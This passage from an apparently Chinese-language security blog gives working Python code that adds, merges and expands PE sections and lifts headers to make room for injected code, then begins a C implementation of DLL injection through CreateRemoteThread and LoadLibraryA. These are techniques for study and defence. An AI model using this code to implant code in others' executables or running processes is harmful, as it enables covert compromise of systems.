    new_section<span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">=</span> data_size  
    new_section<span class="token punctuation">.</span>VirtualAddress <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>  
       pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">/</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment<span class="token punctuation">)</span> <span class="token operator">*</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment  
    new_section<span class="token punctuation">.</span>SizeOfRawData <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>  
       data_size <span class="token operator">/</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>FileAlignment<span class="token punctuation">)</span> <span class="token operator">*</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>FileAlignment  
    new_section<span class="token punctuation">.</span>PointerToRawData <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData <span class="token operator">+</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>SizeOfRawData  
    new_section<span class="token punctuation">.</span>Characteristics <span class="token operator">=</span> <span class="token number">0x60000000</span>  
    <span class="token comment"># 修改节区数量和我文件大小  </span>
    pe<span class="token punctuation">.</span>FILE_HEADER<span class="token punctuation">.</span>NumberOfSections <span class="token operator">+=</span> <span class="token number">1</span>  
    pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SizeOfImage <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SizeOfImage <span class="token operator">+</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span>  
       <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">/</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment<span class="token punctuation">)</span> <span class="token operator">*</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment  
      
    <span class="token comment"># 添加节头和节数据  </span>
    pe<span class="token punctuation">.</span>__structures__<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_section<span class="token punctuation">)</span>  
    padding <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> new_section<span class="token punctuation">.</span>SizeOfRawData  
    <span class="token comment"># pe.__data__ = pe.__data__[:] + padding  </span>
    pe<span class="token punctuation">.</span>set_data_bytes<span class="token punctuation">(</span>new_section<span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">,</span> padding<span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] New section added to PE file."</span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\t[-] FOA: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>new_section<span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">h"</span></span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\t[-] RVA: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>new_section<span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">h"</span></span><span class="token punctuation">)</span>  
    <span class="token comment"># 写入文件  </span>
    modified_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.exe'</span><span class="token punctuation">,</span> <span class="token string">'_modified.exe'</span><span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>modified_filename<span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Modified PE file saved as: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>modified_filename<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span>  
    <span class="token keyword">return</span> new_section<span class="token punctuation">.</span>PointerToRawData<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="提升NT头"><a href="#提升NT头" class="headerlink" title="提升NT头"></a>提升NT头</h4><p>如果节表和节数据之间的空洞不足以再新增一个节，可以使用此方法将没用的DOS Stub段删除，将其后面的NT头整体上移覆盖掉这段数据，那么节表和节数据之间就可以腾出一些空洞。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">lift_header</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>  
    <span class="token triple-quoted-string string">"""  
    删除 dos_stub, 提升PE头  
    """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>  
    begin <span class="token operator">=</span> pe<span class="token punctuation">.</span>DOS_HEADER<span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    end <span class="token operator">=</span> pe<span class="token punctuation">.</span>NT_HEADERS<span class="token punctuation">.</span>__file_offset__  
    offset <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData  
    height <span class="token operator">=</span> end <span class="token operator">-</span> begin  
    <span class="token keyword">if</span> height <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>  
       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] No DOS stub to cover!"</span><span class="token punctuation">)</span>  
       <span class="token keyword">return</span>  
    <span class="token comment"># 修改DOS头属性  </span>
    pe<span class="token punctuation">.</span>DOS_HEADER<span class="token punctuation">.</span>e_lfanew <span class="token operator">-=</span> height  
    pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>CheckSum <span class="token operator">=</span> pe<span class="token punctuation">.</span>generate_checksum<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    <span class="token comment"># 上移头部覆盖dos_stub  </span>
    padding <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> height  
    pe<span class="token punctuation">.</span>__data__ <span class="token operator">=</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span><span class="token punctuation">:</span>begin<span class="token punctuation">]</span> <span class="token operator">+</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span>end<span class="token punctuation">:</span>offset<span class="token punctuation">]</span> <span class="token operator">+</span> padding <span class="token operator">+</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span>offset<span class="token punctuation">:</span><span class="token punctuation">]</span>  
    <span class="token comment">#  写入文件  </span>
    modified_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.exe'</span><span class="token punctuation">,</span> <span class="token string">'_lifted.exe'</span><span class="token punctuation">)</span>  
    <span class="token comment"># pe.write(modified_filename)  </span>
    <span class="token builtin">open</span><span class="token punctuation">(</span>modified_filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>__data__<span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] File header lifted by </span><span class="token interpolation"><span class="token punctuation">&#123;</span>height<span class="token punctuation">&#125;</span></span><span class="token string"> bytes."</span></span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Modified PE file saved as: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>modified_filename<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="1-5-合并节"><a href="#1-5-合并节" class="headerlink" title="1.5 合并节"></a>1.5 合并节</h3><p>这个方法也是为了新增节，通过合并两个节，节表就会腾出一个位置用来存放新增的节。<br>同样，为了不影响其他节，合并最后两个节是最好的选择。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">merge_sections</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>  
    <span class="token triple-quoted-string string">"""  
    合并节  
    """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>  
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span>sections<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>  
       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] The section is too little!"</span><span class="token punctuation">)</span>  
       <span class="token keyword">return</span>  
    section1 <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>  
    section2 <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  
    name1 <span class="token operator">=</span> section1<span class="token punctuation">.</span>Name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>  
    name2 <span class="token operator">=</span> section2<span class="token punctuation">.</span>Name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>  
    virtual_size1 <span class="token operator">=</span> section2<span class="token punctuation">.</span>VirtualAddress <span class="token operator">-</span> section1<span class="token punctuation">.</span>VirtualAddress  
      
    data1 <span class="token operator">=</span> section1<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    data2 <span class="token operator">=</span> section2<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    padding <span class="token operator">=</span> <span class="token punctuation">(</span>virtual_size1 <span class="token operator">-</span> section1<span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'\x00'</span>  
    <span class="token comment"># 修改属性  </span>
    pe<span class="token punctuation">.</span>FILE_HEADER<span class="token punctuation">.</span>NumberOfSections <span class="token operator">-=</span> <span class="token number">1</span>  
    pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SizeOfImage <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>padding<span class="token punctuation">)</span>  
    <span class="token comment"># 修改节表  </span>
    section1<span class="token punctuation">.</span>SizeOfRawData <span class="token operator">=</span> virtual_size1 <span class="token operator">+</span> section2<span class="token punctuation">.</span>Misc_VirtualSize  
    section1<span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">=</span> virtual_size1 <span class="token operator">+</span> section2<span class="token punctuation">.</span>SizeOfRawData  
    section1<span class="token punctuation">.</span>Characteristics <span class="token operator">|</span><span class="token operator">=</span> section2<span class="token punctuation">.</span>Characteristics  
    <span class="token comment"># pe.set_bytes_at_offset(section2.__file_offset__, b'\x00' * 40)  </span>
    <span class="token comment"># 填充节数据  </span>
    <span class="token comment"># begin = section1.PointerToRawData  </span>
    pe<span class="token punctuation">.</span>set_data_bytes<span class="token punctuation">(</span>section1<span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">,</span> data1<span class="token operator">+</span>padding<span class="token operator">+</span>data2<span class="token punctuation">)</span>  
    <span class="token comment"># pe.__data__ = pe.__data__[:begin] + data1 + padding + data2  </span>
    <span class="token comment"># 写入文件  </span>
    modified_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.exe'</span><span class="token punctuation">,</span> <span class="token string">'_merged.exe'</span><span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>modified_filename<span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] The section </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name2<span class="token punctuation">&#125;</span></span><span class="token string"> has been merged to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name1<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Modified PE file saved as: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>modified_filename<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="1-6-扩展节"><a href="#1-6-扩展节" class="headerlink" title="1.6 扩展节"></a>1.6 扩展节</h3><p>如果不新增节，而现有的代码空洞又不足以注入，可以通过修改节表数据，将现有的节的长度增加。这里实现的是扩展最后一个节。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">expand_section</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> data_size<span class="token punctuation">)</span><span class="token punctuation">:</span>  
    <span class="token triple-quoted-string string">"""  
    扩展节（最后一个节）  
    :return: offset of the expanded part of the last section data  
    """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>  
    last_section <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  
    data_size <span class="token operator">+=</span> <span class="token number">5</span>  
    cave_size <span class="token operator">=</span> last_section<span class="token punctuation">.</span>SizeOfRawData <span class="token operator">-</span> last_section<span class="token punctuation">.</span>Misc_VirtualSize  
    <span class="token keyword">if</span> cave_size <span class="token operator">>=</span> data_size<span class="token punctuation">:</span>  
       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] The cave is enough to use, No section expand."</span><span class="token punctuation">)</span>  
       <span class="token keyword">return</span>  
    offset <span class="token operator">=</span> last_section<span class="token punctuation">.</span>PointerToRawData <span class="token operator">+</span> last_section<span class="token punctuation">.</span>Misc_VirtualSize  
    rva <span class="token operator">=</span> last_section<span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> last_section<span class="token punctuation">.</span>Misc_VirtualSize  
    last_name <span class="token operator">=</span> last_section<span class="token punctuation">.</span>Name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>  
    expand_size <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>  
       <span class="token punctuation">(</span>data_size <span class="token operator">-</span> cave_size<span class="token punctuation">)</span> <span class="token operator">/</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>FileAlignment<span class="token punctuation">)</span> <span class="token operator">*</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>FileAlignment  
    <span class="token comment"># 修改节区头属性  </span>
    last_section<span class="token punctuation">.</span>SizeOfRawData <span class="token operator">+=</span> expand_size  
    last_section<span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">+=</span> expand_size  
    last_section<span class="token punctuation">.</span>Characteristics <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">0x60000000</span>  
    <span class="token comment"># 计算内存对齐，修改SizeOfImage  </span>
    pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SizeOfImage <span class="token operator">+=</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment <span class="token operator">*</span> <span class="token punctuation">(</span>  
          math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>last_section<span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">/</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment<span class="token punctuation">)</span>  
          <span class="token operator">-</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span><span class="token punctuation">(</span>last_section<span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">-</span> expand_size<span class="token punctuation">)</span> <span class="token operator">/</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment<span class="token punctuation">)</span><span class="token punctuation">)</span>  
    <span class="token comment"># 填充节区数据  </span>
    padding <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> expand_size  
    <span class="token comment"># pe.__data__ = pe.__data__[:] + padding  </span>
    pe<span class="token punctuation">.</span>set_data_bytes<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span>__data__<span class="token punctuation">)</span><span class="token punctuation">,</span> padding<span class="token punctuation">)</span>  
    <span class="token comment"># 写入文件  </span>
    modified_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.exe'</span><span class="token punctuation">,</span> <span class="token string">'_expanded.exe'</span><span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>modified_filename<span class="token punctuation">)</span>  
    pe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] The </span><span class="token interpolation"><span class="token punctuation">&#123;</span>last_name<span class="token punctuation">&#125;</span></span><span class="token string"> section is extended by </span><span class="token interpolation"><span class="token punctuation">&#123;</span>expand_size<span class="token punctuation">&#125;</span></span><span class="token string"> bytes."</span></span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\t[-] FOA:\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">h"</span></span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\t[-] RVA:\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>rva<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">h"</span></span><span class="token punctuation">)</span>  
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Modified PE file saved as: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>modified_filename<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span>  
    <span class="token keyword">return</span> offset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2-DLL注入"><a href="#2-DLL注入" class="headerlink" title="2 DLL注入"></a>2 DLL注入</h2><p>DLL注入就是让进程加载我们构造的DLL文件，执行代码。与PE注入不同的是，DLL的注入是动态的，是在内存中进行操作的，相对来说复杂一些，网上提到最多的基本就是这四种，其他还有一些特殊利用以后遇到的话再补充。<br>参考了<em><strong>injectAllTheThings</strong></em>项目，本来是用Python写的，但是要处理32位程序的话不太方便，于是用C又写了一遍，没啥耐心了，大部分代码都是借鉴这个项目。</p>
<h3 id="2-1-创建远程线程"><a href="#2-1-创建远程线程" class="headerlink" title="2.1 创建远程线程"></a>2.1 创建远程线程</h3><h4 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h4><p>通过在目标进程的内存中写入DLL的绝对路径，然后调用CreateRemoteThread函数，将LoadLibrary作为回调函数传入，内存中的DLL路径地址作为回调函数的参数，以此实现DLL的注入。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"headers.h"</span></span>

<span class="token keyword">void</span> <span class="token function">demoCreateRemoteThread</span><span class="token punctuation">(</span>LPCSTR pszDllPath<span class="token punctuation">,</span> DWORD dwPid<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 DWORD dwSize <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 打开进程</span>
 HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwPid<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>hProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open process failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">//printf("Path Length：%d\n", dwSize);</span>
 <span class="token comment">// 开辟内存</span>
 LPVOID pszDllAddr <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>pszDllAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] VirtualAllocEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 写入内存</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> pszDllPath<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Write process memory failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 获取LoadLibraryA函数地址</span>
 PROC pfnProcAddr<span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"Kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnProcAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] GetProcAddress failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 创建远程线程</span>
 HANDLE hThread <span class="token operator">=</span> <span class="token function">CreateRemoteThread</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>pfnProcAddr<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>hThread <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Create remote thread failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Inject DLL by CreateRemoteThread success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">VirtualFreeEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
